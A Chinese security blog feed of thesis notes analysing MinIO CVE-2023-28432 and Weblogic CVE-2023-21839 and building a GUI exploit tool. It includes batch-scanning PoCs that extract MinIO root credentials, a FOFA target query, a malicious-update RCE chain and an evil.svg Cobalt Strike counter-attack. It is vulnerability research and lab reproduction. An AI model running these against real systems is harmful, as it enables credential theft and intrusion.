class="hljs-comment">//等待子进程退出</span>proc.waitFor();<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+] 执行结果:\n&quot;</span>+result+<span class="hljs-string">&quot;\n&quot;</span>;</code></pre><h4 id="实现效果-2">实现效果</h4><p>工具测试结果：</p><p>​1）选择该漏洞时回显界面会显示本地自查漏洞的方法，点击检测按钮回显文本框新增如何反制的方法，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201645354.png" alt=" GUI界面检测按钮功能" style="zoom:50%;"></p><p>​ 2）输入本地木马地址，搭建的SVG地址，点击执行，对方CobaltStrike客户端弹出计算器。如用户输入：<em>C:.exe http://10.211.55.6:9898/evil.svg</em>，效果如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201646695.png" alt="实现反制运行计算器" style="zoom:50%;"></p><p>​ 同时反制端开启的Web服务收到访问请求并获取到对方IP，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647798.png" alt="Windows10开启的Web服务记录请求记录" style="zoom:50%;"></p><h4 id="注意事项"><strong>注意事项🚩：</strong></h4><p>​ 1）Java里调用HTTPPOST访问时要加UA头模拟浏览器访问，而不是使用普通的Java代码来进行访问，普通的使用URLConnection访问项目会报错HTTP响应返回400。</p><p>​2）调用Python文件的方法：使用Java中的InputStream来读取/resources目录下的文件，将文件读入内存，并将其写入到一个临时文件（file）中，然后本地执行该文件，而不能简单以文件完整路径的方式来指定文件位置，因为在打包后，文件位置发生了变化，如图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403201647937.png" alt="jar包里调用的Python文件路径直接写绝对路径会报错" style="zoom:50%;"></p><h2 id="总结与改进方向">4. 总结与改进方向</h2><p>针对GUI工具对三种漏洞的检测结果分析：</p><table><colgroup><col style="width: 13%"><col style="width: 28%"><col style="width: 28%"><col style="width: 28%"></colgroup><thead><tr class="header"><th><strong>漏洞类型</strong></th><th><strong>测试结果</strong></th><th><strong>不足之处</strong></th><th><strong>优化方向</strong></th></tr></thead><tbody><tr class="odd"><td>MinIO信息泄露漏洞</td><td>能直观地检测网站是否存在漏洞，并利用漏洞获取敏感信息</td><td>对漏洞利用只是直接的返回HTTP完整响应，需要人为筛选有用信息，且未实现RCE功能</td><td>可通过关键词检索键值对关键信息展示，如账号密码，免去人工检。后续添加对RCE的检测</td></tr><tr class="even"><td>Weblogic未授权远程代码执行漏</td><td>能通过检测和利用两方面实现对网站的漏洞验证和利用</td><td>测试结果仅局限于成功利用漏洞向LDAP服务器发送请求，需要人为通过LDAP服务器访问记录判断是否存在漏洞以及漏洞利用结果</td><td>漏洞检测可通过添加DNSlogAPI爬取访问记录判断漏洞是否存在；漏洞利用可通过集成JNDI注入工具实现LDAP服务器预处理，这样无需自行搭建LDAP服务器，优化使用</td></tr><tr class="odd"><td>Cobalt Strike远程代码执行漏洞</td><td>能直接使用该工具和捕获的木马实现对攻击者的反制，获取对方信息</td><td>用户需自行准备SVG文件和恶意jar包并搭建服务器</td><td>工具提前本地生成所需文件并开启Web服务，方便直接使用，JavaFX偶尔卡顿，还需改进性能，可以尝试多线程之类的</td></tr><tr class="even"><td></td><td></td><td></td><td></td></tr></tbody></table><p>​ 相较于普遍采用的命令行界面Python实现漏洞利用工具，本文采用JavaSwing框架实现GUI界面，提供图形化界面，使得用户可以更加直观地点击操作和控制漏洞测试过程，而不需要记忆和启动命令行输入复杂参数，优化使用体验。</p><p>​不过，在常规日常渗透测试中，漏扫多为多目标，目前GUI界面仅实现了该三种新漏洞的<strong>单目标</strong>探测和利用，且通过输出的程序运行时间发现有些部分运行速度较慢（cs部分），下一步可优化程序效率：通过输出的程序运行时间，我们可以找到程序中耗时较长的部分，进而进行优化和改进，可以尝试采用多线程运行以提高利用效率。针对多目标，下一步可以研究文件导入功能以扩大目标检测范围，以及对应的，针对大范围扫描的结果导出功能模块集成到SwingGUI中有待进一步研究。</p><h2 id="延伸参考">延伸参考</h2><p>在构思漏洞利用工具的时候发现很多好的作品：</p><p>1.<strong>pocsuite，命令行大批量漏扫工具那种，常见的，可以安装pocsuite库然后自定义设计的poc/exp集成进去成工具，还是可玩的，但是对毕设论文来说自己设计的就少了，不够</strong></p><blockquote><p>【如何打造自己的PoC框架-Pocsuite3-使用篇】：https://paper.seebug.org/904/</p><p>【基于Pocsuite框架的XXXX Scanpoc扫描器设计思路】：https://jerrychan807.gitbooks.io/my-python-cookbook/content/ji-yu-pocsuite-kuang-jia-de-oksec-scan-poc-sao-miao-qi-she-ji.html</p><p>【基于pocshuite，web扫描器】：https://github.com/Cl0udG0d/SZhe_Scan</p></blockquote><pre><code class="hljs vim">简单常用命令：<span class="hljs-keyword">python</span> pocsuite.<span class="hljs-keyword">py</span> -r tests/poc_example.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://www.example.<span class="hljs-keyword">com</span>/ --verify-r 为poc路径，可以单个poc文件，也可以是poc文件夹，-<span class="hljs-keyword">u</span>为验证url，--verify为执行poc验证函数</code></pre><p>2.其他可学习设计的优秀漏扫框架：</p><blockquote><p>https://github.com/jiangsir404/POC-S、https://github.com/binfed/POC-T</p><p>【https://blog.csdn.net/Fly_hps/article/details/87932317，笔记学习1，2:https://www.freebuf.com/sectool/237840.html】</p><p>超精简的POC扫描框架:https://github.com/ibey0nd/HScan</p><p>简单py扫描文件:http://www.qb5200.com/article/473543.html、https://cn-sec.com/archives/1275647.html</p></blockquote><p>3.参考</p><blockquote><p>【JAVA-GUI工具的编写】</p><p>https://mp.weixin.qq.com/s/mCQ-rfFP1RN9iaC6bieOiw</p><p>【收集poc的，固定模版，json格式】</p><p>https://github.com/CVEProject/cvelist/blob/master/2023/28xxx/CVE-2023-28432.json</p><p>【一款漏洞验证框架的构思】</p><p>https://xz.aliyun.com/t/6161</p><p>【Frida hook零基础教程】</p><p>https://juejin.cn/post/7139854934928785439</p><p>【python模块学习】</p><p>https://www.huweihuang.com/python-notes/package/package-module.html</p><p>【如何用Java程序运行python文件】</p><p>https://blog.csdn.net/H17Q0818/article/details/105889536</p><p>https://www.yisu.com/zixun/352389.html</p><p>[1]吕校春,李玲莉.基于Swing的JavaGUI组件开发[J].机械工程师,2008,No.203(05):129-131.</p><p>[1]刘晓峥.浅析JavaGUI编程工具集[J].科技信息,2012,No.427(35):596-597.</p></blockquote><h2 id="报错及解决">报错及解决</h2><p>1.写代码运行时403报错，解决：https://blog.csdn.net/xc9711/article/details/124047530</p><pre><code class="hljs less"><span class="hljs-selector-tag">conn</span><span class="hljs-selector-class">.setRequestProperty</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/4.76&quot;</span>);</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304202258366.png" alt="报错案例"></p><p>2.Java调用Python文件失败，找不到文件，卡了很久。。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304230246193.png" alt="报错2" style="zoom:50%;"></p><blockquote><p>https://blog.csdn.net/u013514928/article/details/79360870</p><p>https://blog.csdn.net/weixin_43165220/article/details/104014973</p><p>https://blog.csdn.net/w1014074794/article/details/123951413</p></blockquote><p>​原因：使用Java中的InputStream来读取/resources目录下的文件,将文件读入内存，并将其写入到一个临时文件（file）中，然后执行python脚本，不能以文件完整路径的方式来指定文件位置，<strong><u>因为在打包后，文件位置可能发生了变化。</u></strong></p><p>​ 选择直接写入新文件后运行成功：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304231647016.png" alt="报错解决" style="zoom:50%;"></p><p>3.weblogicpoc运行失败的话应该是依赖问题：工具需导入配置文件wlfullclient.jar，具体操作见之前的漏洞分析文章</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析,工具设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432)</title>
    <link href="/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/"/>
    <url>/2023/04/17/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0minio/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介">1.漏洞简介</h2><p>MinIO介绍：</p><p>​MinIO是一个基于Go语言开源的高性能、分布式对象存储服务器，可以在私有云或公有云环境中部署运行，适用于大规模数据存储和处理场景。MinIO可以用于存储和管理大量的非结构化数据，如图片、视频、日志文件等。它还提供了Docker容器化技术集成方案，方便开发人员部署服务。它支持亚马逊云的S3API（对象存储的接口协议），可以与各种应用程序和工具集成，使得它应用广泛。许多企业和组织都在使用它，例如：华为、谷歌、阿里云、腾讯云、VMware、Splunk、RedHat等。</p><p>​ MinIO的应用场景包括但不限于：</p><p>1）云原生应用程序的对象存储：MinIO可以与Kubernetes、Docker等云原生技术集成，为应用程序提供对象存储服务。</p><p>2）大数据分析：MinIO可以作为数据湖的一部分，存储和管理大规模的非结构化数据，为数据分析提供支持。</p><p>3）备份和归档：MinIO可以作为备份和归档的存储解决方案，为企业提供数据保护和灾难恢复服务。</p><p>4）云存储网关：MinIO可以作为云存储网关，将本地存储和云存储集成在一起，为企业提供灵活的存储解决方案。</p><p>MinIO运行模式：</p><p>​MinIO提供单节点模式和集群模式运行，单节点模式适用于小规模的数据存储需求，而集群模式适用于大规模的数据存储需求。</p><p>​1）单节点模式是指在一台服务器上运行MinIO，所有的数据都存储在该服务器上。这种模式适用于小规模的数据存储需求，例如个人或小型企业的数据存储。</p><p>​2）集群模式是指在多台服务器上运行MinIO，数据被分散存储在不同的服务器上，通过分布式算法实现数据的高可用和负载均衡。这种模式适用于大规模的数据存储需求，例如大型企业或云服务提供商的数据存储。</p><p>漏洞官方通告：https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</p><p>​ MinIOverify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p><p>​MinIO提供了图形化控制台界面来实现自动化数据管理界面，可以简单直观地访问存储套件，即可以直接使用浏览器登录系统管理文件。而在集群模式的配置下<strong>,MinIO部分接口由于配置不当导致信息泄露</strong>，未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终可能导致攻击者以管理员身份登录MinIO接口,能看到对应权限的存储文件<strong>。甚至进一步借助更新功能实现RCE。</strong></p><p>​ <strong><u>只有 MinIO被配置为集群模式时才会受此漏洞影响</u></strong>，此漏洞的利用无需用户身份认证，官方建议所有使用集群模式配置的用户尽快升级。</p><p>影响版本：</p><pre><code class="hljs angelscript">版本号检测：<span class="hljs-number">1.</span>http请求：GET /api/v1/check-version<span class="hljs-number">2.</span>HTTP响应版本小于RELEASE<span class="hljs-number">.2023</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span>T20<span class="hljs-number">-16</span><span class="hljs-number">-18</span>Z则存在漏洞MinIO <span class="hljs-number">2019</span><span class="hljs-number">-12</span><span class="hljs-number">-17</span>T23<span class="hljs-number">-16</span><span class="hljs-number">-33</span>Z &lt;= MinIO &lt; <span class="hljs-number">2023</span><span class="hljs-number">-03</span><span class="hljs-number">-20</span>T20<span class="hljs-number">-16</span><span class="hljs-number">-18</span>Z</code></pre><h2 id="漏洞原理">2.漏洞原理</h2><p>参考：</p><blockquote><p>minio搭建及使用：https://www.bmabk.com/index.php/post/2649.html</p><p>https://blog.csdn.net/qq_35476650/article/details/129748849</p></blockquote><h3 id="信息泄漏获得账号密码">2.1 信息泄漏获得账号密码</h3><p>​MinIO有单机部署和集群部署，源码routers.go里规定路由规则，当被配置为集群模式时会注册BootstrapREST路由，会受此漏洞影响，如下图：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042013817.png" alt="集群模式下注册的路由" style="zoom:50%;"></p><p>​bootstrap-peer-server.go源码定义函数注册路由器，在该路由器上注册了两个RESTAPI处理程序接受HTTP请求，如下图，health请求和verify请求，这些处理程序使用httpTraceHdrs函数包装，以记录HTTP请求的跟踪信息。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014690.png" alt="bootstrapREST路由器的两种API" style="zoom:50%;"></p><p>​bootstrap-peer-server.go源码开头规定了路由访问规则，如下图。bootstrapRESTVersionPrefix：表示RESTAPI版本号的前缀，值为"/v1"，bootstrapRESTPrefix：表示RESTAPI的前缀，值为"/minio/bootstrap"，bootstrapRESTPath：表示完整的RESTAPI路径，值为"/minio/bootstrap/v1"，即最终路由映射：http://xxx:9001/minio/bootstrap/v1/verify。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014837.png" alt="bootstrapREST规定的路由地址" style="zoom:50%;"></p><p>​继续分析VerifyHandler函数，源码如下图，在集群模式的配置下，MinIO界面的路由Verify传递HTTP响应和请求，加载getServerSystemCfg方法，并将其<strong>返回结果编码为JSON格式输出到响应中</strong>。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016361.png" alt="VerifyHandler函数源码" style="zoom:50%;"></p><p>​getServerSystemCfg函数：获取服务器系统配置，包括所有以"MINIO_"开头的环境变量，并去除包含在skipEnvs[envK]键值对中的，最后返回一个包含全局端点和筛选后的环境变量的ServerSystemConfig结构体，如下图</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016577.png" alt="getServerSystemCfg函数源码" style="zoom:50%;"></p><p>​<strong><u>而getServerSystemCfg函数未对用户鉴权且skipEnvs键值对过滤不全</u></strong>，如下图，由于MinIO服务端启动时会把预置的账号、密码等信息加载到环境变量，未设置则默认账号密码为minioadmin/minioadmin。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042017707.png" alt="配置设定的skipEnvs环境变量" style="zoom:50%;"></p><p>​那么未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终导致攻击者以管理员身份登录MinIO管理，访问对应权限的存储文件。</p><p>​ 此漏洞的利用无需用户身份认证，利用复杂度低，影响较大，危害性高。</p><p>​ 影响版本：小于RELEASE.2023-03-20T20-16-18Z。</p><p>​ 版本号检测：HTTP请求：GET /api/v1/check-version，返回MinIO版本。</p><p>省流总结版👇：</p><blockquote><p>VerifyHandler 函数中调用了 getServerSystemCfg() 函数，该函数返回了ServerSystemConfig 结构体，其中包含了环境变量 MINIO_的键值对。由于环境变量是全局可见的，因此会将账号打印出来。为什么环境变量中会包含账号密码信息呢？因为根据官方的启动说明，在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin/minioadmin</p></blockquote><h3 id="寻找rce利用链">2.2 寻找RCE利用链</h3><p>​由于MinIO采用客户端/服务器（C/S）架构，客户端可以使用MinIO提供的命令行工具mc管理服务器，<strong>而MinIO后台提供自定义更新功能，通过利用这个功能运行恶意二进制文件可以实现RCE。</strong>​客户端mc可以实现远程升级MinIO服务器：<code>mc admin update ALIAS</code>。由于升级地址可以自定义，可以指定解析为特定MinIO服务器二进制版本的镜像URL：<code>mc admin update ALIAS https://minio-mirror.example.com/minio</code>不指定地址默认从官网更新。</p><p>​ 而服务器收到更新请求，实际调用/minio/admin/v3/update?updateURL={updateURL}路由处理请求，远程加载二进制文件，通过ServerUpdateHandler函数对文件下载并重启实现更新：​1）验证管理员权限 ​ 2）从指定地址updateURL下载最新版本（二进制文件） ​3）下载二进制文件的数字签名文件 ​4）调用verifyBinary函数验证数字签名文件的签名 ​5）验证无误后备份当前MinIO二进制文件并替换为新的二进制文件 ​6）重启MinIO服务器以使更改生效</p><p><strong>由于用于验证签名的verifyBinary函数存在漏洞。</strong></p><pre><code class="hljs makefile">envMinisignPubKey = <span class="hljs-string">&quot;MINIO_UPDATE_MINISIGN_PUBKEY&quot;</span>minisignPubkey := env.Get (envMinisignPubKey, <span class="hljs-string">&quot;&quot;</span>)</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042023221.png" alt="verifyBinary函数部分源码" style="zoom:50%;"></p><p>​</p><p>​envMinisignPubKey为环境变量MINIO_UPDATE_MINISIGN_PUBKEY的值，若未设定该值，则envMinisignPubKey为空，minisignPubkey变量作用：对更新包的完整性校验，<strong>为空会略过签名校验，直接更新</strong>，如上图。而官方源码默认该环境变量为空，导致漏洞出现。<strong><u>！而用Docker搭建环境的话，Dockerfile默认设定了该环境变量的值，这时无法RCE。</u></strong></p><p>​那么可以通过构造恶意二进制文件，添加执行系统命令的恶意代码（如反弹shell）来实现RCE，但原本的MinIO服务可能会中断。为了无损利用此漏洞，需要基于MinIO源程序进行修改。</p><p>​思路：添加一个后门路由，实现不破坏正常服务地完成RCE。此漏洞的利用与部署方式无关，只要获得管理员账号密码即可进一步实现恶意升级。</p><p>​</p><p>更多参考：</p><blockquote><p>https://cloud.tencent.com/developer/article/2256892?areaSource=&amp;traceId=</p><p>https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ</p><p>https://xz.aliyun.com/t/12356</p><p>https://y4er.com/posts/minio-cve-2023-28432/</p><p>https://exp10it.cn/2023/05/minio-cve-2023-28432-%E8%87%AA%E6%9B%B4%E6%96%B0-rce-%E5%88%86%E6%9E%90/#%E8%87%AA%E6%9B%B4%E6%96%B0-rce</p><p>https://www.freebuf.com/vuls/363647.html</p><p>魔改源码：https://github.com/AbelChe/evil_minio</p><p>官方升级说明：https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html#command-mc.admin.update</p></blockquote><h2 id="复现">3.复现</h2><h3 id="环境搭建">3.1 环境搭建</h3><blockquote><p>https://note.dolyw.com/docker/07-MinIO.html【集群】</p><p>https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md</p></blockquote><p>​用本地Docker服务开启容器，下载docker-compose.yml：其中包含3个以集群模式运行的Web服务端口，启动命令：<code>docker-compose up -d</code></p><p>​ 集群启动后，访问http://localhost:9001可以查看MinIOWeb控制台界面，如图，而http://localhost:9000是API服务。</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171950082.png" alt=" MinIO登陆界面" style="zoom: 25%;"></p><p>⚠️集群启动后，访问<code>http://your-ip:9001</code>可以查看Web管理页面，访问<code>http://your-ip:9000</code>是API服务</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172004759.png" alt="测试环境" style="zoom: 33%;"></p><h3 id="pocs">3.2 pocs</h3><p>工具：python3</p><p>python3 minio.py -u <a href="http://127.0.0.1:1111/">http://127.0.0.1:1111</a> 单个url测试</p><p>python3 minio.py -f url.txt 批量检测</p><p>扫描结束后会在当前目录生成存在漏洞url的vuln.txt</p><blockquote><p>pocs:</p><p>https://github.com/MzzdToT/CVE-2023-28432</p><p>https://github.com/Mr-xn/CVE-2023-28432</p></blockquote><p>poc1</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-comment"># Author : whgojp</span><span class="hljs-comment"># Enable colors</span>GREEN=<span class="hljs-string">&#x27;\033[0;32m&#x27;</span>NC=<span class="hljs-string">&#x27;\033[0m&#x27;</span>count=0<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span>  ((count++))  response=$(curl -s -XPOST <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>/minio/bootstrap/v1/verify -k&quot;</span> --connect-timeout 3)<span class="hljs-comment">#修改一下 这里加了-k 忽略对 SSL 证书验证</span>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$response</span>&quot;</span> | grep -q <span class="hljs-string">&quot;MinioEnv&quot;</span>; <span class="hljs-keyword">then</span><span class="hljs-comment">#匹配关键词</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GREEN&#125;</span>[!] <span class="hljs-variable">$&#123;line&#125;</span><span class="hljs-variable">$&#123;NC&#125;</span>：is Vulnerable！！！\n&quot;</span>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> &gt;&gt; result.txt  <span class="hljs-keyword">else</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;[+] (<span class="hljs-variable">$&#123;count&#125;</span>/<span class="hljs-subst">$(wc -l &lt; MinIO.txt)</span>) Scanning: <span class="hljs-variable">$&#123;line&#125;</span>\n&quot;</span>  <span class="hljs-keyword">fi</span><span class="hljs-keyword">done</span> &lt; MinIO.txt</code></pre><p>poc2</p><pre><code class="hljs bash"><span class="hljs-comment"># 需要开集群模式</span>curl -XPOST x.x.x.x:9000/minio/bootstrap/v1/verify<span class="hljs-comment"># 简单批量检测</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `cat url.txt`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>;curl -XPOST <span class="hljs-variable">$i</span>/minio/bootstrap/v1/verify --connect-timeout 3; <span class="hljs-keyword">done</span></code></pre><p>poc3</p><pre><code class="hljs python"><span class="hljs-comment">#code by step 垃圾实现，新建tagets.txt设把MinIO的api端口链接放到tagets.txt中。</span><span class="hljs-comment">#很垃圾的实现就是了</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> json<span class="hljs-comment"># 打开保存目标 URL 的文本文件</span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;targets.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f,<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;results.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f_out:    <span class="hljs-comment"># 逐行读取目标 URL 并发送 GET 请求</span>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:        <span class="hljs-comment"># 删除行末的换行符</span>        target = line.rstrip(<span class="hljs-string">&#x27;\n&#x27;</span>)        <span class="hljs-comment"># 发送 GET 请求并获取响应</span>        <span class="hljs-keyword">try</span>:             response = requests.post(target+<span class="hljs-string">&quot;/minio/bootstrap/v1/verify&quot;</span>, data=&#123;<span class="hljs-string">&#x27;key&#x27;</span>: <span class="hljs-string">&#x27;value&#x27;</span>&#125;,timeout=<span class="hljs-number">7</span>)            <span class="hljs-comment"># 判断响应中是否包含特定字符串并输出结果</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MINIO_ROOT_PASSWORD&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;MINIO_ROOT_USER&#x27;</span> <span class="hljs-keyword">in</span> response.text:                print(<span class="hljs-string">f&quot;Found &#x27;vulnerable&#x27; in <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)                f_out.write(<span class="hljs-string">f&quot;Found &#x27;vulnerable&#x27; in <span class="hljs-subst">&#123;target&#125;</span>\n&quot;</span>)            <span class="hljs-keyword">else</span>:                 print(<span class="hljs-string">&quot;not vulnerable&quot;</span>)        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:            <span class="hljs-comment"># 如果连接失败，则打印错误信息并继续到下一个目标</span>            print(<span class="hljs-string">f&quot;Connection error&quot;</span>)            <span class="hljs-keyword">continue</span></code></pre><h3 id="本地利用">3.3 本地利用</h3><p>​ 用上述的poc批量扫描探测漏洞是否存在：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171957787.png" alt="poc批量扫描" style="zoom:50%;"></p><p>​ 单个检测利用：</p><p>​命令行直接访问漏洞地址：<code>curl 'http://localhost:9000/minio/bootstrap/v1/verify' -XPOST</code>即可查看敏感信息:</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042039468.png" style="zoom:50%;"></p><p>​</p><p>​用shell命令jq看得更方便，jq：把文本字符串格式化成json格式的工具。</p><p>​ jq安装：</p><pre><code class="hljs awk">macos：brew install jqlinux通用安装：wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/stedolan/</span>jq<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/jq-1.6/</span>jq-linux64chmod a+x jq-linux64 &amp;&amp; mv jq-linux64 <span class="hljs-regexp">/usr/</span>bin/jqcentos：yum install epel-releaseyum install jqubuntu：apt updateapt install -y jq</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171955480.png" alt="jq格式敏感信息" style="zoom: 25%;"></p><p>关键信息：</p><pre><code class="hljs 1c"><span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>: <span class="hljs-string">&quot;minioadmin&quot;</span>,<span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>: <span class="hljs-string">&quot;minioadmin-vulhub&quot;</span></code></pre><p>拿到账号密码成功登陆后台：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172000866.png" alt="登陆MinIO后台" style="zoom: 25%;"></p><h3 id="资产搜索关键词">3.4 资产搜索关键词</h3><p>fofa：</p><pre><code class="hljs routeros"><span class="hljs-attribute">banner</span>=<span class="hljs-string">&quot;MinIO&quot;</span> || <span class="hljs-attribute">header</span>=<span class="hljs-string">&quot;MinIO&quot;</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">&quot;MinIO Browser&quot;</span></code></pre><h2 id="修复及补丁分析">4.修复及补丁分析</h2><p>1.更新版本</p><p>MinIO 官方已发布相应的补丁修复漏洞，用户可通过升级到RELEASE.2023-03-20T20-16-18Z 版本进行漏洞修复。</p><p>https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z</p><blockquote><p>补丁：https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077</p><p>分析：https://y4er.com/posts/minio-cve-2023-28432/</p></blockquote><p>2.MinIO 官方已发布相应的补丁修复信息泄露漏洞和RCE漏洞：</p><p>​ 1）环境变量过滤器增加了敏感字段，输出不会再回显账号密码。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042048331.png" alt=" skipEnvs增加敏感字段" style="zoom:50%;"></p><p>​ 2）bootstrap-peer-server.go源码新增envValues[envK] =logger.HashString (env.Get(envK,""))，回显的环境变量不再明文处理，而是hash加密。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049438.png" alt="补丁对环境变量的处理" style="zoom: 67%;"></p><p>​ 3）新增HTTP请求token验证，对用户鉴权，验证不通过返回HTTP 403Forbidden响应，只有登录用户才能访问</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049285.png" alt="补丁新增用户鉴权" style="zoom:50%;"></p><p>​4）针对利用自更新功能实现RCE的漏洞，通过在源码cmd/update.go文件增加二进制文件签名校验，签名公钥不再默认为空，服务器会验证数字签名文件的签名是否与MinIO官方发布的数字签名公钥匹配，以确保数字签名文件的真实性。</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042051826.png" alt="补丁新增官方签名公钥" style="zoom:50%;"></p><h2 id="延伸参考">延伸参考</h2><blockquote><p>后续rce：https://www.gksec.com/MinIO_RCE.html</p><p>https://nvd.nist.gov/vuln/detail/CVE-2021-21287</p><p>赵静静,金慧峰,李霄.基于MinIO存储的综合实践管理平台开发[J].软件,2022,43(10):55-59.</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)</title>
    <link href="/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/"/>
    <url>/2023/03/27/%E6%AF%95%E8%AE%BE%E7%AC%94%E8%AE%B0-Weblogic/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介">1.漏洞简介</h2><p>CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDIlookup 操作，当 JDK版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE漏洞</p><ul><li>WebLogic_Server = 12.2.1.3.0</li><li>WebLogic_Server = 12.2.1.4.0</li><li>WebLogic_Server = 14.1.1.0.0</li></ul><h2 id="漏洞原理">2.漏洞原理</h2><p>简单总结版：</p><blockquote><p>​ 由于WeblogicIIOP/T3协议存在缺陷，当IIOP/T3协议开启时，未经身份验证的攻击者通过IIOP/T3协议向受影响的服务器发送恶意的请求。<strong>主要风险点是lookup方法的使用。</strong></p><p>​ 